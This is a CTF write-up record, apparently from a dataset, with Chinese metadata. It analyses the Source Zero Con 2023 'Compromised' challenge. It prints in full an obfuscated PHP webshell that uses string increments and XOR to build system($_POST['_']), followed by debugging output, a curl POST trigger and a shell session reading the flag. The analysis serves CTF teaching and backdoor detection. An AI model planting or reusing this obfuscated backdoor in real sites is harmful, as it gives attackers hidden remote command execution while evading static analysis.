---
title: Source Zero Con Writeup – Compromised
contest: Source Zero Con
year: 2023
difficulty: medium
vuln_type: web_unknown
tags:
- php-backdoor
- phpjs-eval
- webshell
- dynamic-function
- lfi-to-rce
attack_chain:
- 网站音频流被黑，源码可读
- 后门文件 /backdoor.php 注释分析
- $_=``.[].[] 执行反引号 id 转字符串数组
- $_2 = ++$_ 链式自增得 'system' (chr 115+...+116+101+109)
- $_1 = $__[2]; $_1++ × 6 得 'ystem
- $_0 = $_ 链式自增至 's' 后 ++得 's'/'s'+1
- $_55 = '_'.(','^'|').('/'^'`').('-'^'~').(')'^'}') = '_POST
- $_($$$_55[_]) 等价于 system($_POST['_'])
- POST _=id 调系统命令
- cat /flag_3_7764865c46bfce2c138e77ae5407354e.txt
key_payload: '$_($$_55[_])  # system($_POST[''_''])'
one_liner: Source Zero Con 2023 Compromised：PHP 后门 + 链式自增/异或构造 dynamic function。
lesson: 短小 PHP 后门常用反引号 + 自增 + 异或绕静态分析；运行时 payload 拆分是关键。
quality: medium
full_path: Source_Zero_Con_Writeup_–_Compromised.full.md
meta_path: Source_Zero_Con_Writeup_–_Compromised.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: Source Zero Con Writeup – Compromised。Source Zero Con 2023 Compromised：PHP 后门 + 链式自增/异或构造 dynamic function。。关键路径：网站音频流被黑，源码可读 → 后门文件 /backdoor.php 注释分析 → $_=``.[].[] 执行反引号 id 转字符串数组。经验：短小 PHP 后门常用反...
category: web
subcategory: web_other
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/122471.html
reasoning_chain:
- 网站音频流被黑，源码可读 → /backdoor.php → 触发点：PHP 后门
- 假设：$_=``.[] 执行反引号 id 转字符串数组 → 观察：[0]='i' [1]='d'
- $_1 = $__[2] 不存在 → null → ++$_1 六次到 'y'
- $_ 自增两次到 's' → $_2 = ++$_ 链式自增至 'system'
- 假设：$_55 = '_'.(','^'|').('/'^'`').('-'^'~').(')'^'}') 异或拼 '_POST'
- 观察：最终 payload $_($$_55[_]) = system($_POST['_'])
- 动作：curl -X POST /backdoor.php -d '_=id' → 命令执行
- 动作：cat /flag_3_7764865c46bfce2c138e77ae5407354e.txt → flag
failed_attempts:
- 试图直接看 backdoor.php 文本 → 失败：被混淆，需动态调试 echo
- 试图用 GET 参数 → 失败：后门只接 POST 参数 _
key_observations:
- 短小 PHP 后门常用反引号 + 自增 (++) + 异或 (^) 绕静态分析
- 运行时 payload 拆分 + 链式自增是 PHP 无字符后门经典手法
- shell_exec() 抛 ValueError 是反混淆调试信号
- echo $_55 调试打印拼出字符串是后门还原关键
prerequisites:
- PHP 字符串自增 + 异或 (++) (^) 运算符
- PHP 反引号 `` shell_exec 行为
- PHP 数组字符串转换规则
- PHP 动态函数调用 $_(args)
---
# Source Zero Con Writeup – Compromised

> 原文: https://www.ctfiot.com/122471.html
> ID: 122471


```
Someone keeps hacking my audio streaming website and I don't know how! I think they left a backdoor or something! Can you take a look at it?
Did you find anything interesting yet? Is there a feature you can leverage to read the server-side code?
Now that you can read the server-side code, did you find any backdoor injected in them? If the answer is yes, try using that backdoor to read the flag located at the '/' directory!
<?php $_=``.[];
$__=@$_;
$_= $__[0];
 $_1 = $__[2];
 $_1++;
 $_1++;
$_1++;
$_1++;
$_1++;
$_1++;
$_++;
$_++;
$_0 = $_;
$_++;
$_2 = ++$_;
 $_55 = '_'.(','^'|').('/'^'`').('-'^'~').(')'^'}');
 $_ = $_2.$_1.$_2.$_0;
 $_($$_55[_]);
?>
127.0.0.1:
26423 [500]: GET /backdoor.php - Uncaught ValueError: shell_exec(): Argument #1 ($command) cannot be empty in /root/backdoor.php:1
Stack trace:
#0 /root/backdoor.php(1): shell_exec()
#1 {main}
 thrown in /root/backdoor.php on line 1
<?php $_=``.[];
127.0.0.1:
26724 [500]: GET /backdoor.php - Uncaught Error: Call to undefined function yjyw() in /root/backdoor.php:18
Stack trace:
#0 {main}
 thrown in /root/backdoor.php on line 18
$_($$_55[_]);
<?php $_=`id`.[];
$__=@$_;
$_= $__[0];
 $_1 = $__[2];
<snip>
$_++;
$_0 = $_;
$_++;
$_2 = ++$_;
 $_55 = '_'.(','^'|').('/'^'`').('-'^'~').(')'^'}');
echo $_55;
 $_ = $_2.$_1.$_2.$_0;
 //$_($$_55[_]);
?>
$_($_POST[_])
www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ ls -al /
 ls -al /
 total 84
 drwxr-xr-x 1 root root 4096 Jun 22 16:21 .
 drwxr-xr-x 1 root root 4096 Jun 22 16:21 ..
 drwxr-xr-x 1 root root 4096 Nov 15 2022 bin
 drwxr-xr-x 2 root root 4096 Sep 3 2022 boot
 drwxr-xr-x 5 root root 360 Jun 22 16:21 dev
 drwxr-xr-x 1 root root 4096 Jun 22 16:21 etc
 -rw-r--r-- 1 root root 35 Jun 22 13:28 flag_3_7764865c46bfce2c138e77ae5407354e.txt
 drwxr-xr-x 2 root root 4096 Sep 3 2022 home
 drwxr-xr-x 1 root root 4096 Nov 15 2022 lib
 drwxr-xr-x 2 root root 4096 Nov 14 2022 lib64
 drwxr-xr-x 2 root root 4096 Nov 14 2022 media
 drwxr-xr-x 2 root root 4096 Nov 14 2022 mnt
 drwxr-xr-x 2 root root 4096 Nov 14 2022 opt
 dr-xr-xr-x 296 root root 0 Jun 22 16:21 proc
 drwx------ 1 root root 4096 Nov 15 2022 root
 drwxr-xr-x 1 root root 4096 Nov 15 2022 run
 drwxr-xr-x 1 root root 4096 Nov 15 2022 sbin
 drwxr-xr-x 2 root root 4096 Nov 14 2022 srv
 dr-xr-xr-x 13 root root 0 Jun 22 16:21 sys
 drwxrwxrwt 1 root root 4096 Jun 22 13:28 tmp
 drwxr-xr-x 1 root root 4096 Nov 14 2022 usr
 drwxr-xr-x 1 root root 4096 Nov 15 2022 var
 www-data@comprom-1uocqb-1687450894-f49f96585-wb4jp:/www$ cat flag_3_7764865c46bfce2c138e77ae5407354e.txt
 <w$ cat /flag_3_7764865c46bfce2c138e77ae5407354e.txt
 flag{p3rs1s<snip>32}
```
